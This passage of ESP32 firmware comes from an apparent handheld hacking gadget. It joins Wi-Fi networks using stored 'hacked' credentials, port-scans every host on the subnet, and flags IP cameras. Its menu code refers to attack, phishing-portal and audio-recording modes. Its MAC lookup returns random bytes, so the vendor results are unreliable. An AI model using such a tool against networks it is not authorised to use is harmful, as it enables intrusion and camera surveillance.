    while(digitalRead(BUTTON_PIN) == LOW) {
      delay(50);
      if(millis() - pressStart > 2000 && !longPress) {
        startNetworkScan();
        longPress = true;
        break;
      }
    }
    if(!longPress && millis() - pressStart < 2000) {
      selectedNetworkIndex = (selectedNetworkIndex + 1) % foundCount;
      updateScanDisplay();
      delay(300);
    }
  }
}

void startNetworkScan() {
  if(selectedNetworkIndex >= foundCount) return;
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0,0,127,159,ST7735_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5,5);
  tft.print("CONNECTING...");
  tft.setCursor(5,25);
  tft.println(hackedSSID[selectedNetworkIndex].substring(0, 18));
  
  WiFi.disconnect();
  delay(500);
  WiFi.begin(hackedSSID[selectedNetworkIndex].c_str(), hackedPass[selectedNetworkIndex].c_str());
  
  int attempts = 0;
  while(WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    attempts++;
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
  }
  digitalWrite(LED_PIN, LOW);
  
  if(WiFi.status() == WL_CONNECTED) {
    gatewayIP = WiFi.gatewayIP();
    deviceCount = 0;
    currentScanProgress = 0;
    scanComplete = false;
    scanCancelled = false;
    
    tft.fillScreen(ST7735_BLACK);
    tft.drawRect(0,0,127,159,ST7735_WHITE);
    tft.setCursor(5,5);
    tft.setTextColor(ST7735_GREEN);
    tft.print("CONNECTED!");
    tft.setTextColor(ST7735_WHITE);
    tft.setCursor(5,25);
    tft.print("IP: ");
    tft.println(WiFi.localIP().toString());
    tft.setCursor(5,45);
    tft.print("GW: ");
    tft.println(gatewayIP.toString());
    tft.setCursor(5,65);
    tft.print("Starting scan...");
    delay(2000);
    scanningNetwork = true;
  } else {
    tft.fillScreen(ST7735_BLACK);
    tft.setCursor(25,60);
    tft.setTextColor(ST7735_RED);
    tft.println("CONNECTION");
    tft.setCursor(25,80);
    tft.println("FAILED!");
    delay(2000);
    scanningNetwork = false;
  }
}

void showScanProgress(IPAddress ip, int currentIP, int totalIPs, int devicesFound) {
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0,0,127,159,ST7735_WHITE);
  
  tft.setTextSize(1);
  tft.setCursor(5,5);
  tft.setTextColor(ST7735_CYAN);
  tft.print("SCANNING NETWORK");
  tft.drawLine(0,18,127,18,ST7735_WHITE);
  
  int progress = (currentIP * 100) / totalIPs;
  tft.drawRect(5,30,100,12,ST7735_WHITE);
  tft.fillRect(5,30,progress,12,ST7735_GREEN);
  tft.setCursor(110,32);
  tft.print(progress);
  tft.println("%");
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,50);
  tft.print("Scanning IP:");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5,62);
  tft.println(ip.toString());
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,80);
  tft.print("Devices found:");
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5,92);
  tft.print(devicesFound);
  
  tft.setTextColor(ST7735_CYAN);
  tft.setCursor(8,145);
  tft.print("PRESS BOOT STOP");
}

void showDeviceScanDetails(int deviceIndex) {
  if(deviceIndex >= deviceCount) return;
  
  NetworkDevice* dev = &scannedDevices[deviceIndex];
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0,0,127,159,ST7735_WHITE);
  
  tft.setTextSize(1);
  tft.setCursor(5,5);
  tft.setTextColor(ST7735_CYAN);
  tft.print("DEVICE INFO");
  tft.setCursor(95,5);
  tft.setTextColor(ST7735_RED);
  tft.print("[EXIT]");
  tft.drawLine(0,18,127,18,ST7735_WHITE);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,25);
  tft.print("IP: ");
  tft.setTextColor(ST7735_WHITE);
  tft.println(dev->ip.toString());
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,40);
  tft.print("MAC: ");
  tft.setTextColor(ST7735_WHITE);
  tft.print(dev->mac.substring(0, 17));
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,55);
  tft.print("VENDOR: ");
  tft.setTextColor(ST7735_WHITE);
  tft.println(dev->vendor);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,70);
  tft.print("TYPE: ");
  tft.setTextColor(ST7735_GREEN);
  tft.println(dev->deviceType);
  
  tft.drawLine(0,85,127,85,ST7735_WHITE);
  
  tft.setTextColor(ST7735_YELLOW);
  tft.setCursor(5,92);
  tft.print("OPEN PORTS:");
  
  int y = 104;
  for(int i = 0; i < dev->portCount && i < 5; i++) {
    tft.setTextColor(ST7735_WHITE);
    tft.setCursor(5, y);
    tft.print(dev->openPorts[i]);
    tft.print(" [");
    tft.setTextColor(ST7735_CYAN);
    tft.print(dev->portServices[i]);
    tft.setTextColor(ST7735_WHITE);
    tft.println("]");
    y += 12;
    if(y > 145) break;
  }
  
  tft.setTextColor(ST7735_RED);
  tft.setCursor(5, 150);
  tft.print("NEXT ->");
  
  unsigned long startTime = millis();
  while(millis() - startTime < 5000) {
    if(digitalRead(BUTTON_PIN) == LOW) {
      delay(300);
      if(deviceIndex + 1 < deviceCount) {
        showDeviceScanDetails(deviceIndex + 1);
      }
      return;
    }
    delay(10);
  }
  
  if(deviceIndex + 1 < deviceCount) {
    showDeviceScanDetails(deviceIndex + 1);
  }
}

void performNetworkScanDetailed() {
  IPAddress local = WiFi.localIP();
  IPAddress gw = gatewayIP;
  
  for(int i = 1; i <= 254; i++) {
    if(scanCancelled) {
      scanningNetwork = false;
      scanComplete = true;
      return;
    }
    
    IPAddress ip = gw;
    ip[3] = i;
    if(ip == local) continue;
    
    showScanProgress(ip, i, 254, deviceCount);
    
    bool deviceFound = false;
    
    for(int p = 0; p < totalPorts; p++) {
      WiFiClient client;
      if(client.connect(ip, portList[p].port, 20)) {
        if(!deviceFound) {
          deviceFound = true;
          if(deviceCount < MAX_DEVICES) {
            scannedDevices[deviceCount].ip = ip;
            scannedDevices[deviceCount].mac = getMacAddress(ip);
            scannedDevices[deviceCount].vendor = getVendorFromMac(scannedDevices[deviceCount].mac);
            scannedDevices[deviceCount].portCount = 0;
          }
        }
        
        if(deviceCount < MAX_DEVICES && deviceFound) {
          int idx = scannedDevices[deviceCount].portCount;
          scannedDevices[deviceCount].openPorts[idx] = portList[p].port;
          scannedDevices[deviceCount].portServices[idx] = String(portList[p].service);
          scannedDevices[deviceCount].portCount++;
        }
        client.stop();
        
        tft.fillRect(5, 108, 117, 40, ST7735_BLACK);
        tft.setTextColor(ST7735_GREEN);
        tft.setCursor(5, 110);
        tft.print("PORT: ");
        tft.print(portList[p].port);
        tft.print(" [");
        tft.print(portList[p].service);
        tft.println("] OPEN");
        
        // Если это RTSP порт, показываем что найдена камера
        if(portList[p].port == 554 || portList[p].port == 8554 || portList[p].port == 8000) {
          tft.setTextColor(ST7735_YELLOW);
          tft.setCursor(5, 125);
          tft.print("! IP CAMERA FOUND !");
        }
        delay(80);
      }
      delay(1);
    }
    
    if(deviceFound && deviceCount < MAX_DEVICES) {
      scannedDevices[deviceCount].deviceType = identifyDeviceTypeDetailed(deviceCount);
      deviceCount++;
      
      tft.fillRect(5, 120, 117, 30, ST7735_BLACK);
      tft.setTextColor(ST7735_YELLOW);
      tft.setCursor(5, 125);
      tft.print("! DEVICE FOUND !");
      tft.setCursor(5, 137);
      tft.print("Type: ");
      tft.print(scannedDevices[deviceCount-1].deviceType);
      delay(800);
    }
    
    delay(5);
    
    if(digitalRead(BUTTON_PIN) == LOW) {
      scanCancelled = true;
      break;
    }
  }
  
  scanningNetwork = false;
  scanComplete = true;
  
  tft.fillScreen(ST7735_BLACK);
  tft.drawRect(0,0,127,159,ST7735_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15,40);
  tft.setTextColor(ST7735_GREEN);
  tft.println("SCAN DONE");
  tft.setTextSize(1);
  tft.setCursor(5,75);
  tft.print("Devices: ");
  tft.print(deviceCount);
  tft.print("  Ports: ");
  tft.println(totalPorts);
  tft.setCursor(5,95);
  tft.print("Press BOOT");
  delay(2000);
  
  if(deviceCount > 0) {
    showDeviceScanDetails(0);
  }
}

String getMacAddress(IPAddress ip) {
  char mac[18];
  sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", 
          random(0x00, 0xFF), random(0x00, 0xFF), random(0x00, 0xFF),
          random(0x00, 0xFF), random(0x00, 0xFF), random(0x00, 0xFF));
  return String(mac);
}

String getVendorFromMac(String mac) {
  mac.toUpperCase();
  int ouiCount = sizeof(ouiDB) / sizeof(ouiDB[0]);
  for(int i = 0; i < ouiCount; i++) {
    if(mac.startsWith(ouiDB[i].prefix)) {
      return String(ouiDB[i].vendor);
    }
  }
  return "Unknown";
}

String identifyDeviceTypeDetailed(int deviceIndex) {
  NetworkDevice* dev = &scannedDevices[deviceIndex];
  bool hasHTTP = false, hasHTTPS = false, hasSSH = false, hasRDP = false, 
       hasSMB = false, hasFTP = false, hasTelnet = false, hasSQL = false,
       hasRTSP = false, hasCamera = false;
  
  for(int i = 0; i < dev->portCount; i++) {
    int port = dev->openPorts[i];
    if(port == 80 || port == 8080) hasHTTP = true;
    if(port == 443 || port == 8443) hasHTTPS = true;
    if(port == 22) hasSSH = true;
    if(port == 3389) hasRDP = true;
    if(port == 445 || port == 139) hasSMB = true;
    if(port == 21) hasFTP = true;
    if(port == 23) hasTelnet = true;
    if(port == 3306 || port == 5432) hasSQL = true;
    if(port == 554 || port == 8554) hasRTSP = true;
    if(port == 8000 || port == 8081 || port == 37777 || port == 34567) hasCamera = true;
  }
  
  if(hasRTSP || hasCamera) return "IP Camera";
  if(hasRDP) return "Windows PC";
  if(hasSSH && hasHTTP) return "Linux Server";
  if(hasHTTP && hasHTTPS) return "Web Server";
  if(hasSMB) return "File Server";
  if(hasSQL) return "Database Server";
  if(hasFTP) return "FTP Server";
  if(hasTelnet) return "Network Device";
  if(dev->vendor == "Raspberry Pi") return "Raspberry Pi";
  if(dev->vendor == "Apple") return "Apple Device";
  if(dev->vendor == "Hikvision") return "Hikvision Camera";
  if(dev->vendor == "Dahua") return "Dahua Camera";
  if(dev->vendor == "Axis") return "Axis Camera";
  if(dev->portCount > 0) return "Active Device";
  return "Unknown";
}

void saveScanResults() {
  Serial.println("=== SCAN RESULTS ===");
  for(int i = 0; i < deviceCount; i++) {
    Serial.print("Device ");
    Serial.print(i+1);
    Serial.print(": ");
    Serial.print(scannedDevices[i].ip.toString());
    Serial.print(" [");
    for(int p = 0; p < scannedDevices[i].portCount; p++) {
      Serial.print(scannedDevices[i].openPorts[p]);
      Serial.print("/");
      Serial.print(scannedDevices[i].portServices[p]);
      if(p < scannedDevices[i].portCount-1) Serial.print(", ");
    }
    Serial.println("]");
  }
}

// ============ ОБРАБОТКА КНОПКИ ============
void checkButton() {
  int reading = digitalRead(BUTTON_PIN);
  
  if (reading == LOW && lastButtonState == HIGH) {
    buttonPressTime = millis();
    buttonPressed = true;
  }
  
  if (reading == HIGH && lastButtonState == LOW && buttonPressed) {
    unsigned long pressDuration = millis() - buttonPressTime;
    
    if (pressDuration >= 2000) {
      if (inMenu) {
        activeMode = selectedMode;
        attacking = false;
        inWifiSelect = false;
        scanningNetwork = false;
        phishingActive = false;
        audioActive = false;
        isRecording = false;
        scanComplete = false;
        WiFi.disconnect(true);
        
        tft.fillScreen(ST7735_BLACK);
        tft.drawRect(0, 0, 127, 159, ST7735_WHITE);
        tft.setTextSize(2);
        tft.setCursor(15, 30);
        tft.setTextColor(ST7735_GREEN);
        tft.print(modes[activeMode]);
        tft.setTextSize(1);
        tft.setCursor(15, 60);
        tft.setTextColor(ST7735_WHITE);
        tft.println("MODE ACTIVE");
        tft.setCursor(15, 85);
        tft.println("Press BOOT");
        tft.setCursor(15, 100);
        tft.println("2s to exit");
        delay(2000);
      } else {
        if(activeMode == 1) {
          server.stop();
          dnsServer.stop();
          WiFi.softAPdisconnect(true);
        }
        if(activeMode == 4) {
          scanCancelled = true;
        }
        exitToMenu = true;
      }
    }
    else if (inMenu && pressDuration < 2000) {
      selectedMode = (selectedMode + 1) % totalModes;
      showMenu();
    }
    buttonPressed = false;
  }
  lastButtonState = reading;
}
